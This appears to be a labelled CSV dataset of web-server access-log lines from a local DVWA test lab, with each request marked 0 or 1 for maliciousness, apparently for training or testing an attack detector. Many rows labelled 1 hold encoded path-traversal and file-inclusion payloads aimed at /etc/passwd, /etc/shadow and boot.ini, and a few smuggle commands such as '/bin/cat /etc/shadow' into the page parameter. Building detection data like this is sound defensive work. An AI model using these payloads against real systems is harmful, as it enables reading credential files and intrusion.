128,"127.0.0.1 - - [28/Apr/2021:22:49:39 -0400] ""GET /DVWA/instructions.php HTTP/1.1"" 200 7546 ""http://127.0.0.1/DVWA/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
90,"127.0.0.1 - - [28/Apr/2021:22:30:58 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cshadow%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
120,"127.0.0.1 - - [28/Apr/2021:21:49:06 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 487 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
166,"127.0.0.1 - - [28/Apr/2021:22:31:02 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%0a%2fbin%2fcat%20%2fetc%2fshadow HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
165,"127.0.0.1 - - [28/Apr/2021:21:58:09 -0400] ""GET /DVWA/dvwa/images/logo.png HTTP/1.1"" 304 181 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
148,"127.0.0.1 - - [28/Apr/2021:21:41:37 -0400] ""GET /DVWA/ HTTP/1.1"" 302 448 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
177,"127.0.0.1 - - [28/Apr/2021:21:42:17 -0400] ""GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1"" 200 815 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
112,"127.0.0.1 - - [28/Apr/2021:21:49:04 -0400] ""GET /DVWA/setup.php HTTP/1.1"" 200 1957 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
218,"127.0.0.1 - - [28/Apr/2021:22:12:28 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 487 ""http://127.0.0.1/DVWA/security.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
88,"127.0.0.1 - - [28/Apr/2021:22:49:59 -0400] ""GET /DVWA/vulnerabilities/brute/?username=a&password=fff&Login=Login HTTP/1.1"" 200 1687 ""http://127.0.0.1/DVWA/vulnerabilities/brute/?username=admin&password=password&Login=Login"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
33,"127.0.0.1 - - [28/Apr/2021:22:31:54 -0400] ""GET /DVWA/vulnerabilities/fi/?page=C%3a%2finetpub%2fwwwroot%2fglobal%2easa HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
180,"127.0.0.1 - - [28/Apr/2021:22:33:11 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
184,"127.0.0.1 - - [28/Apr/2021:21:53:22 -0400] ""GET /DVWA/dvwa/images/logo.png HTTP/1.1"" 304 181 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
68,"127.0.0.1 - - [28/Apr/2021:22:27:20 -0400] ""GET /DVWA/dvwa/css/main.css HTTP/1.1"" 200 1445 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=../etc/passwd"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
143,"127.0.0.1 - - [28/Apr/2021:22:30:50 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%5c%5c%2e%2f%2e%5c%5c%2e%2f%2e%5c%5c%2e%2f%2e%5c%5c%2e%2f%2e%5c%5c%2e%2f%2e%5c%5c%2e%2fetc%2fpasswd HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
105,"127.0.0.1 - - [28/Apr/2021:22:30:36 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1"" 200 2385 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
136,"127.0.0.1 - - [28/Apr/2021:21:58:09 -0400] ""GET /DVWA/dvwa/css/main.css HTTP/1.1"" 200 1445 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
110,"127.0.0.1 - - [28/Apr/2021:22:49:41 -0400] ""GET /DVWA/vulnerabilities/brute/ HTTP/1.1"" 200 1663 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
26,"127.0.0.1 - - [28/Apr/2021:22:51:26 -0400] ""POST /DVWA/vulnerabilities/xss_s/ HTTP/1.1"" 200 1883 ""http://127.0.0.1/DVWA/vulnerabilities/xss_s/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
182,"127.0.0.1 - - [28/Apr/2021:22:49:40 -0400] ""GET /DVWA/setup.php HTTP/1.1"" 200 2229 ""http://127.0.0.1/DVWA/instructions.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
168,"127.0.0.1 - - [28/Apr/2021:21:41:37 -0400] ""GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1"" 200 815 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
139,"127.0.0.1 - - [28/Apr/2021:21:42:20 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 487 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
109,"127.0.0.1 - - [28/Apr/2021:22:32:58 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00%2ejpg HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
103,"127.0.0.1 - - [28/Apr/2021:21:58:21 -0400] ""GET /DVWA/logout.php HTTP/1.1"" 302 336 ""http://127.0.0.1/DVWA/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
16,"127.0.0.1 - - [28/Apr/2021:21:41:37 -0400] ""GET /DVWA/dvwa/images/spanner.png HTTP/1.1"" 200 749 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
48,"127.0.0.1 - - [28/Apr/2021:21:44:08 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 488 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
43,"127.0.0.1 - - [28/Apr/2021:22:28:23 -0400] ""GET /DVWA/vulnerabilities/fi/?page=../../../../../../../../../../../../etc/passwd HTTP/1.1"" 200 2422 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
59,"127.0.0.1 - - [28/Apr/2021:22:11:37 -0400] ""GET /DVWA/dvwa/images/logo.png HTTP/1.1"" 304 181 ""http://127.0.0.1/DVWA/vulnerabilities/csrf/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
193,"127.0.0.1 - - [28/Apr/2021:21:44:08 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 487 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
232,"127.0.0.1 - - [28/Apr/2021:21:58:18 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 487 ""http://127.0.0.1/DVWA/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
91,"127.0.0.1 - - [28/Apr/2021:22:30:34 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhosts%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
131,"127.0.0.1 - - [28/Apr/2021:22:50:41 -0400] ""GET /DVWA/dvwa/css/source.css HTTP/1.1"" 200 497 ""http://127.0.0.1/DVWA/vulnerabilities/csrf/test_credentials.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
32,"127.0.0.1 - - [28/Apr/2021:22:30:47 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2fetc%2fpasswd HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
194,"127.0.0.1 - - [28/Apr/2021:22:30:35 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
203,"127.0.0.1 - - [28/Apr/2021:22:30:41 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2fetc%2fpasswd HTTP/1.1"" 200 2385 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
46,"127.0.0.1 - - [28/Apr/2021:22:51:03 -0400] ""GET /DVWA/vulnerabilities/sqli/?id=4&Submit=Submit HTTP/1.1"" 200 1670 ""http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=3&Submit=Submit"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
201,"127.0.0.1 - - [28/Apr/2021:21:53:23 -0400] ""POST /DVWA/setup.php HTTP/1.1"" 302 342 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
111,"127.0.0.1 - - [28/Apr/2021:21:58:07 -0400] ""GET /DVWA/dvwa/images/logo.png HTTP/1.1"" 304 181 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
178,"127.0.0.1 - - [28/Apr/2021:22:27:20 -0400] ""GET /DVWA//dvwa/js/add_event_listeners.js HTTP/1.1"" 200 626 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=../etc/passwd"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
189,"127.0.0.1 - - [28/Apr/2021:22:32:53 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00%2ehtml HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
107,"127.0.0.1 - - [28/Apr/2021:21:40:29 -0400] ""GET /dvwa HTTP/1.1"" 404 488 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
229,"127.0.0.1 - - [28/Apr/2021:21:53:22 -0400] ""GET /DVWA/dvwa/css/main.css HTTP/1.1"" 200 1445 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
125,"127.0.0.1 - - [28/Apr/2021:21:53:28 -0400] ""GET /DVWA/dvwa/images/login_logo.png HTTP/1.1"" 200 9375 ""http://127.0.0.1/DVWA/login.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
66,"127.0.0.1 - - [28/Apr/2021:22:28:10 -0400] ""GET /DVWA/vulnerabilities/fi/?page=././././././././././././etc/passwd HTTP/1.1"" 200 1352 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
37,"127.0.0.1 - - [28/Apr/2021:21:58:09 -0400] ""GET /DVWA//dvwa/js/add_event_listeners.js HTTP/1.1"" 200 625 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
75,"127.0.0.1 - - [28/Apr/2021:22:31:06 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%00%2fetc%2fshadow%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
71,"127.0.0.1 - - [28/Apr/2021:22:51:10 -0400] ""GET /DVWA/vulnerabilities/xss_r/ HTTP/1.1"" 200 1648 ""http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2,"127.0.0.1 - - [28/Apr/2021:21:40:29 -0400] ""GET /favicon.ico HTTP/1.1"" 404 487 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
57,"127.0.0.1 - - [28/Apr/2021:22:30:49 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2fetc%2fshadow HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
8,"127.0.0.1 - - [28/Apr/2021:22:15:12 -0400] ""GET /DVWA/vulnerabilities/fi/?page=a HTTP/1.1"" 200 1351 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
151,"127.0.0.1 - - [28/Apr/2021:22:27:20 -0400] ""GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1"" 200 815 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=../etc/passwd"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
99,"127.0.0.1 - - [28/Apr/2021:21:59:01 -0400] ""GET /DVWA/vulnerabilities/fi/?page=include.php HTTP/1.1"" 200 1631 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
138,"127.0.0.1 - - [28/Apr/2021:21:49:05 -0400] ""POST /DVWA/setup.php HTTP/1.1"" 302 342 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
49,"127.0.0.1 - - [28/Apr/2021:22:31:42 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%5c%5c%26apos%3b%2fbin%2fcat%20%2fetc%2fpasswd%5c%5c%26apos%3b HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
106,"127.0.0.1 - - [28/Apr/2021:22:15:11 -0400] ""GET /DVWA/vulnerabilities/fi/?page=a HTTP/1.1"" 200 1351 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
141,"127.0.0.1 - - [28/Apr/2021:22:19:40 -0400] ""GET /DVWA/login.php HTTP/1.1"" 200 1161 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
132,"127.0.0.1 - - [28/Apr/2021:22:31:08 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%00%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
207,"127.0.0.1 - - [28/Apr/2021:21:58:07 -0400] ""GET /DVWA/dvwa/css/main.css HTTP/1.1"" 200 1445 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
23,"127.0.0.1 - - [28/Apr/2021:22:31:30 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
127,"127.0.0.1 - - [28/Apr/2021:22:12:47 -0400] ""GET /DVWA/vulnerabilities/fi/?page=include.php HTTP/1.1"" 200 1627 ""http://127.0.0.1/DVWA/security.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
69,"127.0.0.1 - - [28/Apr/2021:22:32:00 -0400] ""GET /DVWA/vulnerabilities/fi/?page=C%3a%2fboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
214,"127.0.0.1 - - [28/Apr/2021:22:49:55 -0400] ""GET /DVWA/hackable/users/admin.jpg HTTP/1.1"" 200 3793 ""http://127.0.0.1/DVWA/vulnerabilities/brute/?username=admin&password=password&Login=Login"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
0,"127.0.0.1 - - [28/Apr/2021:22:50:05 -0400] ""POST /DVWA/vulnerabilities/exec/ HTTP/1.1"" 200 1629 ""http://127.0.0.1/DVWA/vulnerabilities/exec/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
213,"127.0.0.1 - - [28/Apr/2021:22:50:41 -0400] ""GET /DVWA/vulnerabilities/csrf/test_credentials.php HTTP/1.1"" 200 862 ""http://127.0.0.1/DVWA/vulnerabilities/csrf/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
40,"127.0.0.1 - - [28/Apr/2021:22:31:17 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2fetc%2fpasswd HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
162,"127.0.0.1 - - [28/Apr/2021:22:11:37 -0400] ""GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1"" 200 815 ""http://127.0.0.1/DVWA/vulnerabilities/csrf/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
34,"127.0.0.1 - - [28/Apr/2021:22:32:22 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2fboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
190,"127.0.0.1 - - [28/Apr/2021:21:41:37 -0400] ""GET /DVWA/login.php HTTP/1.1"" 302 336 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
202,"127.0.0.1 - - [28/Apr/2021:22:30:34 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2fboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
142,"127.0.0.1 - - [28/Apr/2021:21:53:22 -0400] ""GET /DVWA/setup.php HTTP/1.1"" 200 1952 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
67,"127.0.0.1 - - [28/Apr/2021:21:58:12 -0400] ""GET /DVWA/vulnerabilities/upload/ HTTP/1.1"" 200 1802 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
102,"127.0.0.1 - - [28/Apr/2021:22:31:51 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fbin%2fid%7c HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
108,"127.0.0.1 - - [28/Apr/2021:22:32:45 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot%2eini%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
181,"127.0.0.1 - - [28/Apr/2021:22:12:31 -0400] ""POST /DVWA/security.php HTTP/1.1"" 302 429 ""http://127.0.0.1/DVWA/security.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
158,"127.0.0.1 - - [28/Apr/2021:22:49:37 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 451 ""http://127.0.0.1/DVWA/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
197,"127.0.0.1 - - [28/Apr/2021:22:51:01 -0400] ""GET /DVWA/vulnerabilities/sqli/?id=2&Submit=Submit HTTP/1.1"" 200 1672 ""http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
222,"127.0.0.1 - - [28/Apr/2021:22:12:20 -0400] ""GET /DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd HTTP/1.1"" 200 336 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
149,"127.0.0.1 - - [28/Apr/2021:22:50:49 -0400] ""GET /DVWA/vulnerabilities/upload/ HTTP/1.1"" 200 1708 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
173,"127.0.0.1 - - [28/Apr/2021:22:19:40 -0400] ""GET /DVWA/vulnerabilities/fi/?page=a HTTP/1.1"" 302 512 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
22,"127.0.0.1 - - [28/Apr/2021:22:12:26 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 487 ""http://127.0.0.1/DVWA/about.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
78,"127.0.0.1 - - [28/Apr/2021:22:51:02 -0400] ""GET /DVWA/vulnerabilities/sqli/?id=3&Submit=Submit HTTP/1.1"" 200 1668 ""http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=2&Submit=Submit"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
55,"127.0.0.1 - - [28/Apr/2021:21:53:22 -0400] ""GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1"" 200 815 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
80,"127.0.0.1 - - [28/Apr/2021:22:31:04 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%00%2fetc%2fpasswd%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
153,"127.0.0.1 - - [28/Apr/2021:22:49:55 -0400] ""GET /DVWA/vulnerabilities/brute/?username=admin&password=password&Login=Login HTTP/1.1"" 200 1708 ""http://127.0.0.1/DVWA/vulnerabilities/brute/?username=haha&password=abc&Login=Login"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
233,"127.0.0.1 - - [28/Apr/2021:22:31:39 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2ewinnt%2fdesktop%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
155,"127.0.0.1 - - [28/Apr/2021:21:42:17 -0400] ""GET /DVWA/dvwa/css/main.css HTTP/1.1"" 200 1445 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
135,"127.0.0.1 - - [28/Apr/2021:22:51:14 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=hello HTTP/1.1"" 200 1659 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1,"127.0.0.1 - - [28/Apr/2021:22:14:52 -0400] ""GET /DVWA//dvwa/js/add_event_listeners.js HTTP/1.1"" 200 626 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=a"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
187,"127.0.0.1 - - [28/Apr/2021:22:31:48 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fconf%2fserver%2exml HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
